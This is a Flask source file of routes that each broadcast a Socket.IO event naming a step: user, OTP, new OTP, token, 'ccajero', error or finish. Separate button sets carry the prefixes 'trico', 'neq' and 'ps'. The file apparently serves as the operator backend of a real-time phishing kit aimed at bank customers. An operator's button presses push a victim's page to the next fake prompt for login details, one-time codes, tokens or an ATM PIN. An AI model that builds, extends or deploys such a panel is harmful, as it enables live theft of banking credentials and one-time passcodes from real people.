from flask import request, blueprints, redirect, session, render_template, jsonify
from config.bd import socketio
from flask_socketio import emit

events_routes = blueprints.Blueprint("events", __name__)

@events_routes.route('/otp', methods=['POST'])
def otp():
    
    data = request.get_json()
    
    socketio.emit('posting', {'valor': 'otp', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/newOtp', methods=['POST'])
def newOtp():
    
    data = request.get_json()
    
    socketio.emit('posting', {'valor': 'newOtp', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/user', methods=['POST'])
def user():
    
    data = request.get_json()
    
    socketio.emit('posting', {'valor': 'user', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/newUser', methods=['POST'])
def newUser():
    
    data = request.get_json()
    
    socketio.emit('posting', {'valor': 'newUser', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/finish', methods=['POST'])
def finish():
    
    data = request.get_json()
    
    socketio.emit('posting', {'valor': 'finish', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/token', methods=['POST'])
def token():
    
    data = request.get_json()
    
    socketio.emit('posting', {'valor' : 'token', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/newToken', methods=['POST'])
def newToken():
    
    data = request.get_json()
    
    socketio.emit('posting', {'valor' : 'newToken', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/ccajero', methods=['POST'])
def ccajero():
    
    data = request.get_json()
    
    socketio.emit('posting', {'valor' : 'ccajero', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/ccajeror', methods=['POST'])
def ccajeror():
    
    data = request.get_json()
    
    socketio.emit('posting', {'valor' : 'ccajeror', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/error', methods=['POST'])
def error():
    
    data = request.get_json()
    
    socketio.emit('posting', {'valor' : 'error', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200 

#Trico buttons 
@events_routes.route('/tricoUser', methods=['POST'])
def tricoUser():
    
    data = request.get_json()
    
    socketio.emit('trico', {'valor': 'user', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/tricoOtp', methods=['POST'])
def tricoOtp():
    
    data = request.get_json()
    
    socketio.emit('trico', {'valor': 'otp', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/triconewOtp', methods=['POST'])
def triconewOtp():
    
    data = request.get_json()
    
    socketio.emit('trico', {'valor': 'newOtp', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/tricofinish', methods=['POST'])
def tricoFinish():
    
    data = request.get_json()
    
    socketio.emit('trico', {'valor': 'finish', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

#Neq Buttons
@events_routes.route('/neqUser', methods=['POST'])
def neqUser():
    
    data = request.get_json()
    
    socketio.emit('neq', {'valor': 'user', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/neqOtp', methods=['POST'])
def neqOtp():
    
    data = request.get_json()
    
    socketio.emit('neq', {'valor': 'otp', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/neqnewOtp', methods=['POST'])
def neqNewOtp():
    
    data = request.get_json()
    
    socketio.emit('neq', {'valor' : 'newOtp', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/neqfinish', methods=['POST'])
def neqFinish():
    
    data = request.get_json()
    
    socketio.emit('neq', {'valor': 'finish', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

#Ps Buttons
@events_routes.route('/psUser', methods=['POST'])
def psUser():
    
    data = request.get_json()
    
    socketio.emit('ps', {'valor': 'user', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/psOtp', methods=['POST'])
def psOtp():
    
    data = request.get_json()
    
    socketio.emit('ps', {'valor': 'otp', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/psnewOtp', methods=['POST'])
def psNewOtp():
    
    data = request.get_json()
    
    socketio.emit('ps', {'valor': 'newOtp', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/psfinish', methods=['POST'])
def psFinish():
    
    data = request.get_json()
    
    socketio.emit('ps', {'valor': 'finish', 'valid' : data['id']}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200
